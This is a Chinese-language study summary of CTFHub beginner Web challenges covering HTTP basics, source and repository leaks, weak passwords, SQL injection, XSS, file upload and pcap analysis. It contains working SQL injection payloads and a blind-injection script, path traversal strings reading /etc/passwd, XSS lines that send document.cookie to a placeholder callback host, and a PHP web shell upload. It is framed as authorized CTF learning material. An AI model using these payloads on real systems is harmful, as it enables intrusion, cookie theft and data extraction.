CTFHub Web 新手阶段总结

把「看题名背 Payload」升级成「按输入点判断题型」：分类、共同点、识别信号、技巧与通用做题法。

分类地图 共同点 如何判断 HTTP 协议 信息泄露 密码口令 SQL 注入 XSS 文件上传 流量分析 通用流程 下一阶段

一、全局分类：现在做过什么

先把仓库里的题目按“漏洞发生的位置”分类。这样分类比按题目名称更稳定：同一个大类下，不同小题的入口和回显方式可能不同，但判断思路是一致的。

大类数量已做题目核心目标
Web 前置技能 / HTTP 协议 5 请求方式、302 跳转、Cookie、基础认证、响应包源代码 看懂请求与响应，学会用请求头、状态码、Cookie 和源码找线索。
信息泄露 11 目录遍历；网站源码、bak、vim 缓存、.DS_Store；PHPINFO；Git 泄露、Git #2、Git Stash；SVN 泄露；HG 泄露 从目录、备份、版本控制、配置页和文件读取漏洞中找源码或 Flag。
密码口令 2 弱口令、默认口令 识别产品/后台，尝试常见弱口令或厂商默认凭据。
SQL 注入 10 整数型、字符型、报错注入、布尔盲注、时间盲注、MySQL 结构、Cookie 注入、UA 注入、Referer 注入、过滤空格 让用户输入进入 SQL，读取数据库中的 Flag。
XSS 6 反射型、存储型、DOM 反射型、DOM JumpTo、空格过滤、关键字过滤 让浏览器执行脚本，读取 Bot Cookie 或完成数据外带。
文件上传 7 无限制、JS 前端验证、.htaccess、MIME 验证、00 截断、双写绕过、文件头检测 绕过上传校验，让服务器把上传文件当作脚本执行。
Misc 流量分析（辅助） 6 MySQL、Redis、MongoDB、ICMP、Length、LengthBinary 从协议流量、数据包长度或载荷中还原隐藏信息。

注意：流量分析题在平台分类里属于 Misc，不是 Web。但它们训练的是“看协议、跟流、提取数据”的能力，对做 Web 审计、日志分析和数据包类题目很有帮助，所以放在这里作为辅助阶段一起复习。

二、Web 题的共同点

不管题名是 SQL 注入、XSS 还是文件上传，本质上都在回答同一条链路上的问题：

1. 可控输入在哪里
2. 服务端怎么处理
3. 结果如何回显
4. 如何绕过限制
  • 一定有输入点：URL 参数、POST 表单、Cookie、User-Agent、Referer、上传文件名、文件内容、JSON 字段，甚至 HTTP 方法本身。
  • 一定观察差异：正常请求和恶意请求的响应长度、状态码、关键字、时间、跳转地址、文件路径往往不同。
  • 先判断再利用：先证明“这里能影响服务端”，再决定用 Union、盲注、XSS 外带还是上传绕过。
  • 过滤是绕过的起点：题目故意只做一个黑名单或前端校验时，要找的是过滤边界，而不是硬碰硬。
  • Flag 位置随题型变化：可能在响应源码、数据库、版本库历史、服务器文件、Bot Cookie 或流量载荷里。
  • 可复现最重要：写清楚请求、Payload、判断依据和失败尝试，比只记一个最终答案更有价值。

三、如何快速判断是什么题型

推荐固定使用“四步判定法”：先看入口，再打标记，再看回显，最后做真假对照。

  1. 看入口：页面有没有参数、表单、登录、上传、跳转、Cookie、JS 代码或可疑路径。
  2. 打标记：提交一个不会造成伤害的唯一字符串，例如 ctfhub_marker_7x，观察它出现在哪里。
  3. 看回显：输入被拼进 SQL、HTML、文件路径、HTTP 响应头还是被保存到后端？这决定大类。
  4. 做对照：提交真/假条件、不同状态码、不同延时的请求，确认是否存在布尔、时间或路径侧信道。
观察到的信号优先判断第一动作
题目提示请求方法、403/405、302 跳转、401 认证HTTP 协议题用 cURL/Burp 修改方法、跟随跳转、查看响应头。
页面源码、注释、备份名、.git、.svn、.hg、phpinfo信息泄露查看源码、目录和版本控制元数据，恢复历史文件。
有登录框、错误提示固定、没有验证码或锁定弱口令 / 默认口令先试产品默认账号，再用小规模常见弱口令。
参数参与数据库查询，引号/算式会改变结果或报错SQL 注入先测真/假条件，再判断 Union、报错、布尔或时间盲注。
输入被原样放到 HTML 或 JS 中，页面会执行脚本XSS判断反射、存储还是 DOM，再处理过滤与 Bot 外带。
有文件上传接口，返回保存路径或可访问上传目录文件上传逐层测试扩展名、MIME、文件头、解析规则和路径控制。
参数能控制文件读取路径目录遍历 / 文件包含先用 ../../ 读系统文件，再判断是否包含执行。
数据包中出现数据库、Redis、ICMP 或可疑长度字段流量分析Follow Stream、导出对象、解析协议和载荷。

四、分类详解与做题方法

下面按仓库已经覆盖的大类展开。每一类都按“识别信号 → 共同点 → 做题步骤 → 常用技巧 → 易错点”整理，方便以后遇到新题时直接套用。

1. Web 前置技能 / HTTP 协议（5 题）

请求方式302 跳转CookieBasic Auth响应源码

识别信号

  • 题目直接提示“请使用某种请求方法”“请携带 Cookie”“请完成认证”。
  • 响应状态码是 302、401、405，或者页面跳转与预期不一致。
  • 用浏览器看不到 Flag，但响应头、源码注释或重定向地址里有提示。

共同点

这类题不是复杂漏洞，而是考“你是否会看 HTTP 请求与响应”。线索通常在请求方法、请求头、Cookie、认证头、状态码和源码中，而不是页面正文里。

做题步骤

  1. 用浏览器开发者工具或 cURL 保存原始请求，记录方法、URL、Header、Cookie。
  2. 改一个变量做对照：GET 改 POST、关闭/开启跳转、删除/添加 Cookie、尝试 Basic Auth。
  3. 查看响应行、响应头、重定向 Location、Set-Cookie 和 HTML 注释。
  4. 如果页面提示“响应包源代码”，直接看源代码或使用 view-source，不要只看渲染后的文字。
curl -i http://target/                         # 看响应头和状态码
curl -i -X POST http://target/                 # 切换请求方法
curl -i -L http://target/                      # 跟随 302 跳转
curl -i -b "name=value" http://target/         # 携带 Cookie
curl -i -u admin:admin http://target/          # Basic Auth
curl -i "http://target/?a=1&b=2"                 # 多个参数要正确转义

技巧：Burp Suite 的 Repeater 最适合逐项修改请求；浏览器 Network 面板适合快速观察 302 和 Set-Cookie。

易错点

  • 302 不等于失败，真正的线索常在 Location 或跟随跳转后的页面。
  • Cookie 可能要求特定 Path、Domain 或 Session 一致，不能只复制一半。
  • Basic Auth 的凭据格式是 base64(username:password)，不是普通表单登录。

2. 信息泄露（11 题）

源码泄露备份文件版本控制PHPINFO目录遍历

识别信号

  • 页面源码、注释、JS 文件里出现服务器路径、备份名、版本库路径或提示。
  • 访问常见路径返回 200、目录列表或不同长度的响应：/robots.txt、/phpinfo.php、/.git/HEAD、/.svn/entries、/.hg/、/.DS_Store。
  • 参数像文件名或路径，例如 ?file=、?path=、?page=，可以尝试读取任意文件。
  • 网站源码题通常要下载备份包，再从源码里定位数据库配置、Flag 文件或隐藏路由。

共同点

服务端把不该公开的“文件、元数据或配置”暴露出来。题目不一定有复杂漏洞，关键是信息收集是否完整：目录、源码、备份、版本库、配置页都属于攻击面。

常见泄露入口速查

入口可能发现常用动作
robots.txt、sitemap.xml隐藏目录、后台路径、禁止抓取的文件直接访问并记录路径，再逐层探测。
www.zip、web.zip、backup.zip、*.bak、*~网站源码、配置、数据库信息下载后搜索 flag、数据库配置、路由和注释。
.index.php.swp、.index.php.swo、index.php~vim 缓存或编辑器备份用 vim 恢复，或 strings/正则提取源码。
.DS_Store目录中的文件名列表使用 ds_store/dscanner 解析，再访问泄露的文件。
/.git/、/.svn/、/.hg/源码历史、提交记录、stash、被删除文件用 GitHack、git-dumper、dvcs-ripper 等工具恢复。
phpinfo.php环境变量、绝对路径、扩展、配置项搜索 DOCUMENT_ROOT、disable_functions、open_basedir、$_SERVER 相关输出。
任意文件读取参数系统文件、源码、配置、Flag尝试 ../../、URL 编码、双写编码和绝对路径。

Git 泄露标准流程

# 1. 确认版本库入口
curl -i http://target/.git/HEAD

# 2. 恢复仓库（选择一种工具）
python git_dumper.py http://target/.git ./recovered
# 或使用 GitHack、dvcs-ripper

# 3. 查看所有分支、提交和差异
git log --all --oneline --decorate
git log --all --stat
git diff <commit1> <commit2>

# 4. 查看 stash 和悬空对象
git stash list
git stash show -p
git fsck --lost-found

Git 题的核心：Flag 不一定在当前分支，可能在旧提交、被删除文件、其他分支或 stash 里。恢复仓库后要执行 git log --all，不要只看 git log。

目录遍历与文件读取

?file=../../../../etc/passwd
?file=..%2f..%2f..%2f..%2fetc%2fpasswd
?file=%252e%252e%252fetc%252fpasswd
?file=/var/www/html/flag.php
?file=....//....//etc/passwd

遇到过滤时，先判断过滤的是 ../、点、斜杠还是扩展名，再选择编码、重复路径或绝对路径。不同 PHP 版本的 %00 截断行为不同，不能直接假设。

易错点

  • 只扫描根目录就停止。信息泄露题往往要连续访问：目录 → 文件 → 备份 → 源码 → 新路径。
  • 下载到源码后不搜索，建议直接全局搜索 flag、key、secret、password、DB_。
  • Git 恢复后只看当前 HEAD，遗漏其他分支、旧提交和 stash。

3. 密码口令（2 题）

弱口令默认口令登录框产品指纹

识别信号

  • 出现典型登录页，包含用户名、密码、可能还有验证码。
  • 错误提示固定，例如 user or password is wrong，且没有明显的失败锁定。
  • 页面标题、Logo、表单字段暴露产品名称或设备型号。

共同点

不是爆破越猛越好，而是先识别目标产品与用户名策略，再用最小的候选集验证。CTF 中的弱口令通常是 admin/admin123 这类常见组合；默认口令则来自厂商文档或设备初始账号。

做题步骤

  1. 确认登录请求的字段名、方法、验证码机制和失败特征。
  2. 先测试常见用户名：admin、administrator、guest、test、root。
  3. 如果是产品题，先搜索产品默认账号，不要一上来就大字典。
  4. 用 Burp Intruder、cURL 或 PowerShell 小规模验证；每次都保持验证码/Session 一致。
  5. 成功后立刻检查 Cookie、跳转地址、管理页面源码和后台功能。
curl.exe -i -X POST ^
  --data-urlencode "name=admin" ^
  --data-urlencode "password=admin123" ^
  "http://target/"

原则：只在题目授权环境中测试。真实站点不要进行高频爆破；先检查验证码、CSRF、锁定和速率限制。Hydra 等工具适合授权实验，不适合当作第一反应。

易错点

  • 把“响应长度变化”直接当作成功，实际可能只是错误提示长度不同。
  • 忽略验证码与 Session 绑定，导致请求永远失败。
  • 不识别产品就盲目套字典，浪费时间且容易触发锁定。

4. SQL 注入（10 题）

Union报错布尔盲注时间盲注Header 注入过滤绕过

识别信号

  • 参数进入数据库查询：?id=1、?name=...，页面可能还回显完整 SQL。
  • 输入单引号、双引号或算式后出现 SQL 报错、页面异常、结果数量变化。
  • 真条件和假条件响应不同；或者页面内容完全一样，但特定 Payload 会固定延迟。
  • Cookie、User-Agent、Referer 等请求头被服务端写入 SQL。

子类型速查

子类型典型现象主要方法
整数型注入参数无引号包裹，and 1=1/and 1=2 有差异order by 判断列数，再用 union select 回显。
字符型注入参数被单引号包裹，输入引号报错或改变结果闭合引号并注释，例如 1' and '1'='1。
报错注入页面回显数据库错误信息用 updatexml、extractvalue 等把数据放入错误信息。
布尔盲注不显示数据，只显示成功/失败或不同页面用真假条件当作 Oracle，按字符二分提取。
时间盲注页面内容无差异，但条件成立时响应变慢用 if(condition, sleep(n), 0) 和二分法。
MySQL 结构题目重点在库、表、字段枚举查询 information_schema，再读取目标字段。
Header 注入Cookie/UA/Referer 被拼接到 SQL把注入标记放进对应请求头，注意编码和引号上下文。
过滤绕过空格、关键字或注释被删除/阻断注释代替空格、大小写混写、双写、十六进制字符串。

标准做题流程

  1. 找注入点：用 1、1'、1"、1 and 1=1、1 and 1=2 做对照。
  2. 判断类型：整数还是字符；有回显、报错、布尔差异还是时间差异。
  3. 确定列数：用 order by N 或 union select 1,2,3...。
  4. 确定回显位：让 database()、user()、version() 出现在页面上。
  5. 枚举结构：查 information_schema.tables 和 information_schema.columns。
  6. 读取数据：定位 Flag 表、字段和记录，最后输出到回显位或通过盲注提取。

常用 Payload

# 基础判断
1 and 1=1
1 and 1=2
1' and '1'='1
1' and '1'='2

# 列数
1 order by 2#
1 order by 3#

# Union 回显
0 union select 1,2#
0 union select database(),user()#
0 union select version(),@@version_compile_os#

# 枚举表
0 union select group_concat(table_name),2
from information_schema.tables
where table_schema=database()#

# 枚举字段（flag 的十六进制为 0x666c6167）
0 union select group_concat(column_name),2
from information_schema.columns
where table_schema=database()
and table_name=0x666c6167#

# 读取数据
0 union select flag,2 from flag#

报错、布尔与时间盲注

# 报错注入（不同数据库/版本行为可能不同）
and updatexml(1, concat(0x7e, database()), 1)
and extractvalue(1, concat(0x7e, database()))

# 布尔盲注：条件成立时返回成功页面
1 and ascii(substring((select flag from flag limit 0,1),1,1))>64

# 时间盲注：条件成立时延迟约 2 秒
1 and if(ascii(substring((select flag from flag limit 0,1),1,1))>64, sleep(2), 0)

盲注不要手工逐字符猜。把请求封装成 oracle(condition) 函数，再用二分查找：

import requests

BASE = "http://target/"
EXPR = "(select flag from flag limit 0,1)"

def oracle(condition):
    payload = f"1 and ({condition})"
    r = requests.get(BASE, params={"id": payload}, timeout=10)
    return "query_success" in r.text

def get_char(pos):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        if oracle(f"ascii(substring({EXPR},{pos},1))>={mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low - 1)

flag = ""
for pos in range(1, 80):
    ch = get_char(pos)
    if ch == "\x00":
        break
    flag += ch
    print(flag)

过滤绕过速查

被过滤内容可尝试替代说明
空格/**/、%09、%0a、%0d、括号SQL 注释和空白字符都可用于分隔关键字。
注释符# 的 URL 编码 %23、-- 、/*...*/-- 在 MySQL 中通常需要后面跟空格才稳定。
关键字大小写混写、双写、等价函数、十六进制字符串例如 union、select、and 可能被简单黑名单过滤。
引号十六进制、char()、数字拼接避免提交被过滤的引号，例如 flag 写成 0x666c6167。
逗号调整查询结构、使用 limit offset 等替代写法先确认数据库类型，再选择兼容语法。

易错点

  • 忘记 URL 编码：浏览器里的 # 是片段标识，提交给服务器前必须编码成 %23。
  • 没有先确定列数和回显位，直接套 union select。
  • 盲注没有做多次采样，偶发网络延迟被误判为时间盲注。
  • 只查当前数据库，忽略 information_schema 中的库、表、字段。

五、XSS：输入进入浏览器执行链

反射型存储型DOM 型过滤绕过Bot 外带

识别信号

  • 提交的字符串会出现在 HTML 源码中，且没有被正确编码。
  • 提交内容会持久保存，之后每次访问页面都会再次出现（存储型）。
  • 页面 JavaScript 从 location.hash、location.search 或接口响应中取值，再写入 innerHTML、document.write 等位置（DOM 型）。
  • 题目提供 “Send URL to Bot” 或类似入口，Flag 通常位于 Bot 可访问的 Cookie 中。

三种 XSS 的区别

类型数据经过哪里判断方法利用重点
反射型当前请求 → 当前响应Payload 只在本次请求的响应中出现让 Bot 访问带 Payload 的 URL。
存储型服务端数据库/文件 → 后续页面再次访问页面，Payload 仍然存在先把 Payload 存进去，再把页面 URL 交给 Bot。
DOM 型浏览器端 JS 读取 Source → Sink查看 JS，服务器响应中可能没有 Payload控制 hash、查询参数或 JS 变量，使 Sink 执行。

做题步骤

  1. 提交唯一标记 ctfhub_xss_marker，在响应源码、属性、JS 字符串、URL 中定位输出上下文。
  2. 用最简单的 alert(1) 证明脚本能执行，不要一开始就写复杂 Payload。
  3. 根据上下文选择标签、事件或 JS 闭合方式，再处理空格、关键字等过滤。
  4. 如果 Flag 在 Bot Cookie 中，使用回调服务器接收 document.cookie；弹窗本身通常无法把结果带回攻击者。
  5. 注意编码层级：Payload 中的特殊字符先编码，完整 URL 作为 Bot 参数时还要再编码。
# HTML 文本上下文
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# 属性上下文（示例，具体闭合符取决于页面）
" onmouseover="alert(1)
"><svg onload=alert(1)>

# 数据外带
<script>location='https://your-callback.example/?c='+encodeURIComponent(document.cookie)</script>
<img src=x onerror="fetch('https://your-callback.example/?c='+encodeURIComponent(document.cookie))">

XSS 题的关键不是弹窗，而是攻击链：输入点 → 页面执行 → Bot 访问 → 读取 Cookie → 外带到你的回调地址。尤其要注意 HttpOnly Cookie 不能被 JavaScript 读取，真正能被脚本读取的往往是另一个 Flag Cookie。

常见过滤绕过

过滤可尝试思路
空格%09、%0a、%0d、/HTML 解析器不一定需要普通空格，标签和事件属性可换写法。
script 关键字大小写混写、<img>、<svg>、事件属性不是只有 <script> 才能执行 JavaScript。
alert 关键字confirm、prompt、DOM 操作、回调请求先确认执行点，再换成实际外带代码。
普通引号反引号、实体编码、URL 编码要结合 HTML/JS 上下文，而不是盲目替换。
括号或点号别名、模板字符串、事件调用、编码DOM 型题尤其要查看已有 JS 变量和可利用函数。

易错点

  • 把“服务器响应里有 Payload”误认为“浏览器一定执行了”。要看上下文和 CSP。
  • 反射型题目只提交 Payload 给页面，忘记把最终 URL 交给 Bot。
  • 存储型题目没有触发 Bot，或者把带 Payload 的 URL 再次编码错误。
  • DOM 型题目只盯服务器响应，没有在 Sources 里搜索 innerHTML、eval、document.write。

六、文件上传：逐层拆校验

无限制前端验证MIME文件头扩展名绕过.htaccess00 截断/双写

识别信号

  • 页面有文件选择框或上传接口，上传成功后会返回文件名、相对路径或访问地址。
  • 限制可能出现在前端 JS、请求的 Content-Type、文件扩展名、文件头、保存路径或服务器解析配置中。
  • 上传目录可以直接访问，且服务器允许执行上传的脚本扩展名。

共同点

文件上传题的通用目标是“让服务器保存一个可执行文件，再通过 Web 访问它”。每道题只是在不同层加了一个校验，因此最重要的是按层测试，而不是一开始就使用复杂 Payload。

按顺序测试

顺序校验层测试方式可能的绕过
1无校验直接上传 .php访问返回路径，执行命令。
2JS 前端验证查看表单 JS，禁用 JS 或改请求前端限制不影响服务端，直接构造上传请求。
3MIME 验证检查 multipart 的 Content-Type声明为 image/jpeg、image/png、image/gif。
4文件头验证检查文件前几个字节在前面加 GIF89a 或 JPEG/PNG 魔数，再放 PHP 代码。
5扩展名黑名单逐个测试可执行后缀.phtml、.php5、.php7、.phar、大小写、尾点/空格。
6服务端关键字删除构造嵌套关键字双写，例如 shell.pphphp 经过一次删除后变成 shell.php。
7路径/文件名拼接控制上传目录或文件名参数旧 PHP 环境尝试 %00 截断；现代环境通常无效。
8解析规则限制上传 .htaccess用 AddType 让图片后缀被当作 PHP 解析。

基础 Web Shell 与 .htaccess

<?php echo file_get_contents('/flag'); ?>

curl -i -F "file=@shell.php;filename=shell.php;type=image/png" http://target/

# 文件头检测：文件开头放 GIF89a，后面接 PHP 代码

# 访问 Web Shell

注意：Content-Type 是客户端提交的，服务端只检查它就等于没有真正验证文件。文件头检测也一样，只检查前几个字节不代表文件是合法图片。

易错点

  • 只改扩展名，不检查服务器是否真的允许该后缀解析。
  • 文件头 Payload 中把 GIF89a 放到 PHP 标签后面，导致检测失败。
  • 00 截断依赖旧 PHP 版本；现代 PHP 会拒绝 NUL 字节路径，不能把历史技巧当成通用解法。
  • 上传成功但不知道路径。要回看响应、Location、页面源码和上传目录。

七、流量分析（6 题，Misc 辅助）

MySQLRedisMongoDBICMPLengthLengthBinary

识别信号

  • 题目提供 .pcap、.pcapng 或抓包数据，要求分析协议、载荷、长度或通信内容。
  • 协议名出现在题名中，例如 MySQL、Redis、MongoDB；或者题目只给数据包，需要先看协议分布。
  • 数据包长度、时间间隔、ICMP 载荷等字段有规律，可能承载隐写数据。

通用方法

  1. 先用 Wireshark 看 Protocol Hierarchy、Conversations 和 Endpoints，确定主要协议。
  2. 对感兴趣的 TCP/UDP 流使用 Follow Stream，观察请求与响应中的命令、字段和字符串。
  3. 协议题优先看命令与响应：MySQL 查询、Redis 命令、MongoDB 文档字段。
  4. ICMP 题检查 Data 字段；Length 题检查数据包长度或长度差的二进制/ASCII 映射。
  5. 重复数据用 tshark 或 Python/Scapy 批量导出，再拼接还原。
tshark -r capture.pcap -Y "mysql" -T fields -e mysql.query
tshark -r capture.pcap -Y "redis" -T fields -e redis.command
tshark -r capture.pcap -Y "icmp" -T fields -e data.data
tshark -r capture.pcap -T fields -e frame.len

价值：流量分析虽然不属于 Web，但能训练“协议字段 → 数据结构 → 还原信息”的思维。做 Web 日志、SQL 注入流量、Bot 回连分析时，这套方法会反复用到。

八、通用做题流程：新手建议固定成清单

  1. 0. 保存基线：记录原始 URL、方法、Header、Cookie、响应长度和状态码。
  2. 1. 信息收集：看页面源码、注释、JS、robots.txt、响应头、错误信息、Frame 和 Network 请求。
  3. 2. 找输入点：参数、表单、Cookie、UA、Referer、上传、JSON、HTTP 方法。
  4. 3. 打标记：提交唯一字符串，判断数据是否进入 SQL、HTML、文件路径、日志或存储。
  5. 4. 判断类型：有回显、报错、布尔、时间、文件路径、脚本执行中的哪一种现象。
  6. 5. 最小验证：先用一个简单 Payload 证明可行性，例如 1=1、alert(1)、合法图片头。
  7. 6. 逐层绕过：每次只改一个变量，区分前端、MIME、文件头、黑名单、解析规则和路径限制。
  8. 7. 获取 Flag：检查响应、源码、数据库、Cookie、上传文件、服务器文件和流量载荷。
  9. 8. 写复盘：记录最终请求、Payload、判断依据、失败尝试、原理和修复建议。

Flag 常见位置

  • HTTP 响应正文、HTML 注释、JS 变量、响应头、Location、Set-Cookie。
  • 数据库表字段、information_schema 枚举出的业务表、SQL 报错信息。
  • Git/SVN/HG 的旧提交、stash、悬空对象、被删除文件。
  • 服务器上的 /flag、flag.php、flag_*.php 或环境变量。
  • Bot/管理员 Cookie，或通过回调服务器收到的查询参数。
  • PCAP 中的数据包载荷、协议命令、响应内容或长度编码。

九、常用技巧速查

9.1 编码与符号

字符/场景常见写法注意
URL 中的 #%23不编码时浏览器把它当作 URL 片段。
空格%20、+、/**/、%09、%0a不同上下文对空格的解释不同。
路径穿越../、%2e%2e%2f、%252e%252e%252f先观察过滤发生在解码前还是解码后。
SQL 注释#、-- 、/*...*/-- 后通常需要空格。
字符串替代0x666c6167、char()用于绕过引号或关键字黑名单。

9.2 工具分工

工具最适合做什么不要做什么
浏览器 DevTools看源码、Network、Cookie、JS Source/Sink不要只看渲染结果。
Burp Suite拦截、改写、重放请求，观察响应差异不要不看请求就盲目扫。
cURL精确复现请求、控制 Header/方法/文件上传注意 Windows 下换行和引号。
dirsearch/gobuster/ffuf目录、文件、备份、版本库入口探测不要用超大字典拖慢环境。
GitHack/git-dumper/dvcs-ripper恢复 Git/SVN/HG 元数据恢复后要查全部分支和历史。
Python requests盲注、批量请求、二分查找、回调验证不要忽略超时和重试。
Wireshark/tshark协议分析、Follow Stream、字段导出不要只凭肉眼扫包，优先过滤。

最重要的一条：任何 Payload 都要能解释“为什么这样写”。如果只知道复制，题目稍微改一个过滤就会失效；知道上下文、输出位置和过滤逻辑，才能自己推导新 Payload。

十、新手常见误区

  • 只看页面文字：源码、注释、响应头和 Network 请求经常比正文更重要。
  • 不做对照：只发一次 Payload 就下结论，没有真/假、正常/异常、前/后的比较。
  • 把前端验证当安全：JS 校验、HTML 提示和按钮禁用都可以绕过，真正的校验在服务端。
  • 把黑名单当完整防护：过滤空格不等于防 XSS，过滤 php 一次不等于防双写，过滤 MIME 不等于检查文件内容。
  • 盲目爆破：密码题应先识别产品和错误特征；SQL 盲注应脚本化，不要手点几百次。
  • 忽略编码层级：外层 URL 编码、内层参数编码和 HTML 实体编码经常叠加。
  • 只记答案：Flag 是动态的，真正可复用的是判断流程和 Payload 模板。

十一、下一阶段路线图

当前阶段已经把最常见的 Web 入口跑通：HTTP 基础、信息泄露、密码口令、SQL 注入、XSS、文件上传。下一步不要急着堆新工具，先把这些题型做到“能解释、能复现、能脚本化”。

阶段学习重点建议目标
巩固期HTTP、信息泄露、密码口令不查 Writeup 也能复现请求；会用 cURL/Burp 精确控制请求。
注入期SQL 注入的 Union、报错、布尔、时间、Header、过滤绕过能独立写一个盲注脚本；能解释每种注入的判断依据。
前端期XSS 反射/存储/DOM、上下文、Bot 外带能画出攻击链；能处理常见空格和关键字过滤。
文件期文件上传的多层校验与解析规则能按“扩展名 → MIME → 文件头 → 路径 → 解析”逐层测试。
进阶期命令执行、文件包含、SSRF、SSTI、XXE、反序列化理解“输入点 → 服务端危险函数 → 回显/外带”的统一模型。
审计期代码审计、JWT/Session、访问控制、WAF 绕过能从源码定位漏洞，而不是只依赖黑盒探测。

建议的练习节奏

  1. 每次只做 1～2 道新题，做完立刻写最小复盘。
  2. 第二天不看 Writeup 重新复现一次，重点看自己卡在哪一层。
  3. 把重复出现的手工步骤写成 Python 脚本或 Burp 宏。
  4. 每周把新题归入本文某个大类，并补充新的“识别信号”和“绕过方式”。
